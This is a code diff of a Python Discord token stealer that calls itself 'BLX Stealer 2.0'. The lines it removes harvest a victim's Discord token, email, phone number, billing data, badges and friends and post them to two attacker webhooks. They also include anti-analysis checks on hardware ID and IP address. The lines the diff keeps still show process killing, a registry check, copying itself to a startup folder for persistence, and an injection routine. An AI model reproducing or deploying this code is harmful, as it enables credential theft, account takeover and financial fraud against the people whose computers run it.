@@ -114,41 +114,7 @@ def process_check():
                         proc.kill()
                     except (psutil.NoSuchProcess, psutil.AccessDenied):
                         pass
-
-
-
-def hwid_check():
-        HWIDS = [
-            "7AB5C494-39F5-4943-9163-47F54D6D5016",
-        ]
-
-        try:
-            HWID = (
-                subprocess.check_output(
-                    r"wmic csproduct get uuid", creationflags=0x08000000
-                )
-                .decode()
-                .split("\n")[1]
-                .strip()
-            )
-
-            if HWID in HWIDS:
-                os.exit(1)
-        except Exception:
-            pass
-
-def ip_check():
-        try:
-            IPS = [
-                "None",
-            ]
-            IP = requests.get("https://api.myip.com").json()["ip"]
-
-            if IP in IPS:
-                os.exit(1)
-        except:
-            pass
-
+                        
 
 def registry_check():
     reg1 = os.system(
@@ -360,42 +326,6 @@ inj3c710n()
 '''
 
 
-def G37UHQFr13ND5(token):
-    badgeList =  [
-        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<a:developer:1095726251001520252> "},
-        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<a:bughunter2:1095726038031548456> "},
-        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<a:activedev:1095725933236858991> "},
-        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early:1095728685144870922> "},
-        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<a:squad:1095728662386577438> "},
-        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<a:squad:1095728662386577438> "},
-        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<a:squad:1095728662386577438> "},
-        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<a:bughunter:1095725763006844948> "},
-        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<a:hypesquad:1095730117327724626> "},
-        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<a:partner:1095725986731004005> "},
-        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<a:staff:1095725959627427861> "}
-    ]
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-    try:
-        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
-    except:
-        return False
-
-    uhqlist = ''
-    for friend in friendlist:
-        OwnedBadges = ''
-        flags = friend['user']['public_flags']
-        for badge in badgeList:
-            if flags // badge["Value"] != 0 and friend['type'] == 1:
-                if not "House" in badge["Name"]:
-                    OwnedBadges += badge["Emoji"]
-                flags = flags % badge["Value"]
-        if OwnedBadges != '':
-            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
-    return uhqlist 
 
 def G3781111N6(token):
     headers = {
@@ -421,69 +351,6 @@ def G3781111N6(token):
     return billing
 
 
-def G3784D63(flags):
-    if flags == 0: return ''
-
-    OwnedBadges = ''
-    badgeList =  [
-        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "developer:1095726251001520252> "},
-        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<a:bughunter2:1095726038031548456> "},
-        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<a:activedev:1095725933236858991> "},
-        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early:1095728685144870922> "},
-        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<a:squad:1095728662386577438> "},
-        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<a:squad:1095728662386577438> "},
-        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<a:squad:1095728662386577438> "},
-        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<a:bughunter:1095725763006844948> "},
-        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<a:hypesquad:1095730117327724626> "},
-        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<a:partner:1095725986731004005> "},
-        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<a:staff:1095725959627427861> "}
-    ]
-    for badge in badgeList:
-        if flags // badge["Value"] != 0:
-            OwnedBadges += badge["Emoji"]
-            flags = flags % badge["Value"]
-
-    return OwnedBadges
-
-def G3770K3N1NF0(token):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-
-    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
-    username = userjson["username"]
-    hashtag = userjson["discriminator"]
-    email = userjson["email"]
-    idd = userjson["id"]
-    pfp = userjson["avatar"]
-    flags = userjson["public_flags"]
-    nitro = ""
-    phone = "-"
-
-    if "premium_type" in userjson: 
-        nitrot = userjson["premium_type"]
-        if nitrot == 1:
-            nitro = "<a:subscriber:1095725882250895481> "
-        elif nitrot == 2:
-            nitro = "<a:boost:1095740247540776991> <a:subscriber:1095725882250895481> "
-    if "phone" in userjson: phone = f'`{userjson["phone"]}`'
-
-    return username, hashtag, email, idd, pfp, flags, nitro, phone
-
-def CH3CK70K3N(token):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-    try:
-        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
-        return True
-    except:
-        return False
-
 
 if getattr(sys, 'frozen', False):
     currentFilePath = os.path.dirname(sys.executable)
@@ -500,90 +367,7 @@ if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower()
     with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
         shutil.copyfileobj(src_file, dst_file)
 
-def UP104D70K3N(token, path):
-    global hook
-    global tgmx
-# womp look at this shitty dual hook
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-    username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
-    if pfp == None: 
-        pfp = "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
-    else:
-        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
-
-    billing = G3781111N6(token)
-    badge = G3784D63(flags)
-    friends = G37UHQFr13ND5(token)
-    if friends == '': friends = "No HQ Friends"
-    if not billing:
-        badge, phone, billing = "🔒", "🔒", "🔒"
-    if nitro == '' and badge == '': nitro = " -"
-
-    data = {
-        "content": f'{g108411NF0()} | Found in `{path}`',
-        "embeds": [
-            {
-            "color": color,
-            "fields": [
-                {
-                    "name": "<:hackerblack:1095747410539593800> Token:",
-                    "value": f"`{token}`\n[Click To Copy](https://superfurrycdn.nl/copy/{token})"
-                },
-                {
-                    "name": "<:mail:1095741024678191114> Email:",
-                    "value": f"`{email}`",
-                    "inline": True
-                },
-                {
-                    "name": "<:phone:1095741029832990720> Phone:",
-                    "value": f"{phone}",
-                    "inline": True
-                },
-                {
-                    "name": "<a:blackworld:1095741984385290310> IP:",
-                    "value": f"`{g371P()}`",
-                    "inline": True
-                },
-                {
-                    "name": "<a:black_hypesquad:1095742323423453224> Badges:",
-                    "value": f"{nitro}{badge}",
-                    "inline": True
-                },
-                {
-                    "name": "<a:blackmoneycard:1095741026850852965> Billing:",
-                    "value": f"{billing}",
-                    "inline": True
-                },
-                {
-                    "name": "<:blackmember:1095740314683179139>  HQ Friends:",
-                    "value": f"{friends}",
-                    "inline": False
-                }
-                ],
-            "author": {
-                "name": f"{username}#{hashtag} ({idd})",
-                "icon_url": f"{pfp}"
-                },
-            "footer": {
-                "text": "BLX Stealer  2.0 antidualhook| remember dont follow skids",
-                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
-                },
-            "thumbnail": {
-                "url": f"{pfp}"
-                }
-            }
-        ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
-        "username": "BLX Stealer  2.0 antidualhook| t.me/blxstealer",
-        "attachments": []
-        }
-    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
-    L04DUr118(tgmx, data=dumps(data).encode(), headers=headers)
-    
 class PcInfo:
     headers = {
         "Content-Type": "application/json",
